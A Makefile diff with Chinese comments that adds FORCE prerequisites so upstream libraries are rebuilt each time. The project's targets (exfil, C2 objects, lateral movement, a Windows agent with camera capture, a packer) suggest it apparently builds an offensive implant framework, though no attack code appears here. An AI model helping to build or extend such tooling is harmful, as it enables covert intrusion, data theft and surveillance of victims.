@@ -31,18 +31,27 @@ all: $(BUILD)/test_exfil $(BUILD)/test_cam_e2e $(BUILD)/test_exfil_circuit $(BUI
 $(BUILD):
 	mkdir -p $(BUILD)
 
-# 上游依赖缺失 -> 触发构建（幂等）
-$(P2PLIB) $(C2OBJS):
+# 上游依赖 -> 触发构建。
+# 必须挂 FORCE：这些目标是具体文件，没有前置依赖，make 见到文件存在就判定为最新、
+# 直接跳过 recipe —— 于是"上游源码已改但产物仍在"时下游静默链接陈旧代码，无任何报错。
+# 挂上 FORCE 后每次都执行 recipe，由上游 make 自身做增量判断（已最新时开销极小）。
+# 不会递归：14_p2p 只请求 08_lateral 的叶子目标，agent_windows 的叶子目标只依赖
+# 20_packer（20_packer 无任何上游），链条都在叶子处终止。
+$(P2PLIB) $(C2OBJS): FORCE
 	@$(MAKE) -C ../14_p2p --no-print-directory \
 	  build/libp2p.a build/c2.o build/c2_frame.o \
 	  build/crypto_gcm.o build/crypto_hash.o build/crypto_x25519.o
 
-$(LATLIB):
+$(LATLIB): FORCE
 	@$(MAKE) -C ../08_lateral --no-print-directory build/proxy.o build/lateral.o
 
-$(AGOBJS):
+$(AGOBJS): FORCE
 	@$(MAKE) -C ../agent_windows --no-print-directory \
 	  build/linux/cam_jpeg.o build/linux/cam_mock.o
+
+FORCE:
+
+.PHONY: FORCE
 
 $(BUILD)/exfil.o: src/exfil.c include/exfil.h | $(BUILD)
 	$(CC) $(CFLAGS) -c $< -o $@
